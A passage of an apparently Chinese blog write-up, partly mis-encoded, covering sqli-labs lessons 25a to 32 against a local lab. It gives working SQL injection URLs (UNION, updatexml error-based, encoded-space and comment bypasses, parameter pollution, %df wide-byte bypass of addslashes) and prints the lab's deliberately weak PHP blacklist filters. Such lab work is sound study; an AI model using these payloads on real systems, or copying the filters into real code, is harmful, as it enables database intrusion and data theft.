class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-25a-Trick-with-OR-amp-AND-Blind-è¿‡æ»¤äº†orå’Œandçš„ç›²æ³¨"><a href="#Less-25a-Trick-with-OR-amp-AND-Blind-è¿‡æ»¤äº†orå’Œandçš„ç›²æ³¨" class="headerlink" title="Less-25a Trick with OR &amp; AND Blind (è¿‡æ»¤äº†orå’Œandçš„ç›²æ³¨)"></a>Less-25a Trick with OR &amp; AND Blind (è¿‡æ»¤äº†orå’Œandçš„ç›²æ³¨)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-23"><a href="#æ‰‹åŠ¨æ³¨å…¥-23" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-25a/?id=-1 <span class="attribute">UNION</span> <span class="literal">select</span> <span class="number">1</span>,@<span class="variable">@basedir</span>,<span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="Less-26-Trick-with-comments-and-space-è¿‡æ»¤äº†æ³¨é‡Šå’Œç©ºæ ¼çš„æ³¨å…¥"><a href="#Less-26-Trick-with-comments-and-space-è¿‡æ»¤äº†æ³¨é‡Šå’Œç©ºæ ¼çš„æ³¨å…¥" class="headerlink" title="Less-26 Trick with comments and space (è¿‡æ»¤äº†æ³¨é‡Šå’Œç©ºæ ¼çš„æ³¨å…¥)"></a>Less-26 Trick with comments and space (è¿‡æ»¤äº†æ³¨é‡Šå’Œç©ºæ ¼çš„æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-24"><a href="#æ‰‹åŠ¨æ³¨å…¥-24" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æˆ‘ä»¬å¯ä»¥ç”¨urlç¼–ç è¿›è¡Œç»•è¿‡(è¿™äº›ç¼–ç åœ¨Windowsä¸‹ä½¿ç”¨å¯èƒ½ä¼šå‡ºç°é—®é¢˜)</p><p>%09 Tabé”®ï¼ˆæ°´å¹³ï¼‰<br>%0a æ–°å»ºä¸€è¡Œ<br>%0c æ–°çš„ä¸€é¡µ<br>%0d return é”®<br>%0b Tabé”®ï¼ˆå‚ç›´ï¼‰<br>%a0 ç©ºæ ¼</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-26/?id=1&#x27;anandd(updatexml(1,concat(0x7e,(<span class="attribute">select</span> @<span class="variable">@version</span>),0x7e),<span class="number">1</span>));%00</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-24"><a href="#æºç åˆ†æ-24" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out spaces</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-è¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šçš„ç›²æ³¨"><a href="#less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-è¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šçš„ç›²æ³¨" class="headerlink" title="less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(è¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šçš„ç›²æ³¨)"></a>less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(è¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šçš„ç›²æ³¨)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-25"><a href="#æ‰‹åŠ¨æ³¨å…¥-25" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>ä¸èƒ½æŠ¥é”™æ³¨å…¥ï¼Œç›´æ¥ç›²æ³¨å³å¯</p><h4 id="æºç åˆ†æ-25"><a href="#æºç åˆ†æ-25" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out spaces</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out spaces</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-è¿‡æ»¤äº†unionå’Œselectçš„"><a href="#less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-è¿‡æ»¤äº†unionå’Œselectçš„" class="headerlink" title="less 27 GET - Error Based- All your UNION &amp; SELECT belong to us (è¿‡æ»¤äº†unionå’Œselectçš„)"></a>less 27 GET - Error Based- All your UNION &amp; SELECT belong to us (è¿‡æ»¤äº†unionå’Œselectçš„)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-26"><a href="#æ‰‹åŠ¨æ³¨å…¥-26" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-27/?id=1&#x27;and(uPdatexml(1,conCat(0x7e,(<span class="attribute">selEct</span> @<span class="variable">@version</span>),0x7e),<span class="number">1</span>));%00</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-26"><a href="#æºç åˆ†æ-26" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us"><a href="#less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us" class="headerlink" title="less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us"></a>less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-27"><a href="#æ‰‹åŠ¨æ³¨å…¥-27" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>ä¸èƒ½æŠ¥é”™æ³¨å…¥ï¼Œç›´æ¥ç›²æ³¨å³å¯</p><h4 id="æºç åˆ†æ-27"><a href="#æºç åˆ†æ-27" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out Select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis-åŸºäºé”™è¯¯çš„ï¼Œæœ‰æ‹¬å·çš„å•å¼•å·å­—ç¬¦å‹ï¼Œè¿‡æ»¤äº†unionå’Œselectç­‰çš„æ³¨å…¥"><a href="#less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis-åŸºäºé”™è¯¯çš„ï¼Œæœ‰æ‹¬å·çš„å•å¼•å·å­—ç¬¦å‹ï¼Œè¿‡æ»¤äº†unionå’Œselectç­‰çš„æ³¨å…¥" class="headerlink" title="less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis (åŸºäºé”™è¯¯çš„ï¼Œæœ‰æ‹¬å·çš„å•å¼•å·å­—ç¬¦å‹ï¼Œè¿‡æ»¤äº†unionå’Œselectç­‰çš„æ³¨å…¥)"></a>less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis (åŸºäºé”™è¯¯çš„ï¼Œæœ‰æ‹¬å·çš„å•å¼•å·å­—ç¬¦å‹ï¼Œè¿‡æ»¤äº†unionå’Œselectç­‰çš„æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-28"><a href="#æ‰‹åŠ¨æ³¨å…¥-28" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>åŒå†™ç»•è¿‡å³å¯</p><h4 id="æºç åˆ†æ-28"><a href="#æºç åˆ†æ-28" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesisåŸºäºç›²æ³¨çš„ï¼Œæœ‰æ‹¬å·çš„å•å¼•å·å­—ç¬¦å‹ï¼Œè¿‡æ»¤äº†unionå’Œselectç­‰çš„æ³¨å…¥"><a href="#less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesisåŸºäºç›²æ³¨çš„ï¼Œæœ‰æ‹¬å·çš„å•å¼•å·å­—ç¬¦å‹ï¼Œè¿‡æ»¤äº†unionå’Œselectç­‰çš„æ³¨å…¥" class="headerlink" title="less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesisåŸºäºç›²æ³¨çš„ï¼Œæœ‰æ‹¬å·çš„å•å¼•å·å­—ç¬¦å‹ï¼Œè¿‡æ»¤äº†unionå’Œselectç­‰çš„æ³¨å…¥"></a>less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesisåŸºäºç›²æ³¨çš„ï¼Œæœ‰æ‹¬å·çš„å•å¼•å·å­—ç¬¦å‹ï¼Œè¿‡æ»¤äº†unionå’Œselectç­‰çš„æ³¨å…¥</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-29"><a href="#æ‰‹åŠ¨æ³¨å…¥-29" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>åŒå†™ç»•è¿‡å³å¯</p><h4 id="æºç åˆ†æ-29"><a href="#æºç åˆ†æ-29" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);//strip out /*</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);//Strip out --.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);//Strip out #.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-29-åŸºäºWAFçš„ä¸€ä¸ªé”™è¯¯"><a href="#Less-29-åŸºäºWAFçš„ä¸€ä¸ªé”™è¯¯" class="headerlink" title="Less-29 åŸºäºWAFçš„ä¸€ä¸ªé”™è¯¯"></a>Less-29 åŸºäºWAFçš„ä¸€ä¸ªé”™è¯¯</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-30"><a href="#æ‰‹åŠ¨æ³¨å…¥-30" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æ³¨æ„è¦é…å¥½<code>tomcat</code>çš„ç›¸å…³ç¯å¢ƒ</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-29/index.jsp?id=1&amp;id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h3 id="Less-30-Get-Blind-Havaing-with-WAF"><a href="#Less-30-Get-Blind-Havaing-with-WAF" class="headerlink" title="Less-30 Get-Blind Havaing with WAF"></a>Less-30 Get-Blind Havaing with WAF</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-31"><a href="#æ‰‹åŠ¨æ³¨å…¥-31" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-29/index.jsp?id=1&amp;id=-1&quot;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h3 id="Less-31-Protection-with-WAF"><a href="#Less-31-Protection-with-WAF" class="headerlink" title="Less-31 Protection with WAF"></a><strong>Less-31 Protection with WAF</strong></h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-32"><a href="#æ‰‹åŠ¨æ³¨å…¥-32" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-29/index.jsp?id=1&amp;id=-1&quot;)<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h3 id="Less-32-Bypass-addslashes"><a href="#Less-32-Bypass-addslashes" class="headerlink" title="Less-32 Bypass addslashes()"></a>Less-32 Bypass addslashes()</h3><h4 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h4><p>mysql åœ¨ä½¿ç”¨ GBK ç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸ºä¸€ä¸ªæ±‰å­—ï¼Œä¾‹å¦‚%aa%5c å°±æ˜¯ä¸€ä¸ª æ±‰å­—ï¼ˆå‰ä¸€ä¸ª ascii ç å¤§äº 128 æ‰èƒ½åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰ã€‚æˆ‘ä»¬åœ¨è¿‡æ»¤ â€™ çš„æ—¶å€™ï¼Œå¾€å¾€åˆ©ç”¨çš„æ€ è·¯æ˜¯å°† â€˜ è½¬æ¢ä¸º \â€™ ï¼ˆè½¬æ¢çš„å‡½æ•°æˆ–è€…æ€è·¯ä¼šåœ¨æ¯ä¸€å…³é‡åˆ°çš„æ—¶å€™ä»‹ç»ï¼‰ã€‚ å› æ­¤æˆ‘ä»¬åœ¨æ­¤æƒ³åŠæ³•å°† â€˜ å‰é¢æ·»åŠ çš„ \ é™¤æ‰ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ€è·¯ï¼š </p><p>ï¼ˆ1ï¼‰%df åƒæ‰ \ å…·ä½“çš„åŸå› æ˜¯ urlencode(â€˜\) &#x3D; %5c%27ï¼Œæˆ‘ä»¬åœ¨%5c%27 å‰é¢æ·»åŠ %dfï¼Œå½¢ æˆ%df%5c%27ï¼Œè€Œä¸Šé¢æåˆ°çš„ mysql åœ¨ GBK ç¼–ç æ–¹å¼çš„æ—¶å€™ä¼šå°†ä¸¤ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ±‰å­—ï¼Œæ­¤ äº‹%df%5c å°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œ%27 åˆ™ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ç¬¦å·åœ¨å¤–é¢ï¼ŒåŒæ—¶ä¹Ÿå°±è¾¾åˆ°äº†æˆ‘ä»¬çš„ç›®çš„ã€‚</p><p>ï¼ˆ2ï¼‰å°† \â€™ ä¸­çš„ \ è¿‡æ»¤æ‰ï¼Œä¾‹å¦‚å¯ä»¥æ„é€  %**%5c%5c%27 çš„æƒ…å†µï¼Œåé¢çš„%5c ä¼šè¢«å‰é¢çš„%5c ç»™æ³¨é‡Šæ‰ã€‚è¿™ä¹Ÿæ˜¯ bypass çš„ä¸€ç§æ–¹æ³•</p><h4 id="æ‰‹åŠ¨æ³¨å…¥-33"><a href="#æ‰‹åŠ¨æ³¨å…¥-33" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-32/?id=-1%df&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-30"><a href="#æºç åˆ†æ-30" class="headerlink" title="æºç 